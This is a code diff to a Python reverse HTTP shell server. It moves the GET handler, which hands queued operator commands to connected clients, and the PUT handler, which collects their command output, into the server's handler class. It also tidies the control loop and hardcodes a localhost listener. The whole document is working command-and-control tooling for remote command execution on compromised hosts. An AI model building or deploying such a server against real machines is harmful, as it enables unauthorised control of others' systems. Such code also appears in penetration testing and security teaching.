@@ -20,45 +20,42 @@ class ReverseHTTPServerHandler(SimpleHTTPRequestHandler):
         HTTP Server Handler for the reverse shell server
     """
 
+    def do_GET(self):
+        """
+        GETs will be used to give commands to the client. If there are
+        any commands in the command queue then they will be output here.
+        If there are no commands then a blank response is given. All requests
+        are given a 200 OK response code.
+        :return:
+        """
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.end_headers()
+        if self.client_address[0] not in connected_clients:
+            connected_clients.append(self.client_address[0])
+        if not command_queue.empty():
+            self.wfile.write(bytes(command_queue.get(), "UTF-8"))
 
-def do_GET(self):
-    """
-    GETs will be used to give commands to the client. If there are
-    any commands in the command queue then they will be output here.
-    If there are no commands then a blank response is given. All requests
-    are given a 200 OK response code.
-    :return:
-    """
-    self.send_response(200)
-    self.send_header('Content-type', 'text/plain')
-    self.end_headers()
-    if self.client_address[0] not in connected_clients:
-        connected_clients.append(self.client_address[0])
-    if not command_queue.empty():
-        self.wfile.write(bytes(command_queue.get(), "UTF-8"))
+    def do_PUT(self):
+        """
+        PUTs will be used to receive responses from the client, just read
+        the request data and add it to the response queue. Always returns
+        200 OK response.
 
+        :return:
+        """
+        # Read the response from the put request
+        length_header = self.headers.get('content-length')
+        length = int(length_header)
+        data = self.rfile.read(length)
+        response = str(data, "utf8")
+        response_queue.put(response)
+        # Respond with a 200
+        self.send_response(200)
+        self.end_headers()
 
-def do_PUT(self):
-    """
-    PUTs will be used to receive responses from the client, just read
-    the request data and add it to the response queue. Always returns
-    200 OK response.
-
-    :return:
-    """
-    # Read the response from the put request
-    length_header = self.headers.get('content-length')
-    length = int(length_header)
-    data = self.rfile.read(length)
-    response = str(data, "utf8")
-    response_queue.put(response)
-    # Respond with a 200
-    self.send_response(200)
-    self.end_headers()
-
-
-def log_message(self, format, *args):
-    return
+    def log_message(self, format, *args):
+        return
 
 
 def run_server(host, port):
@@ -90,11 +87,12 @@ def run_server(host, port):
             command_queue.put(command)
             if command == STOP_COMMAND:
                 connected = False
-        while response_queue.empty():
+        while connected and response_queue.empty():
             sleep(0.2)
-        while not response_queue.empty():
+        while connected and not response_queue.empty():
             print(response_queue.get())
 
+    sleep(1)
     # Shutdown and exit
     print("Stopped reverse HTTP server.")
     server.shutdown()
@@ -102,11 +100,13 @@ def run_server(host, port):
 
 
 # Check that the host and port arguments were given
-if len(argv) < 2 or len(argv) > 2:
-    print("Usage: reverse_http_server.py [host] [port]")
-    exit(1)
+# if len(argv) < 3 or len(argv) > 3:
+#    print("Usage: %s [host] [port]" % argv[0])
+#    exit(1)
 
 # Start up the listening server
-host_arg = str(argv[0])
-port_arg = int(argv[1])
-run_server(host_arg, port_arg)
+# host_arg = str(argv[1])
+# port_arg = int(argv[2])
+# run_server(host_arg, port_arg)
+
+run_server("localhost", 8080)
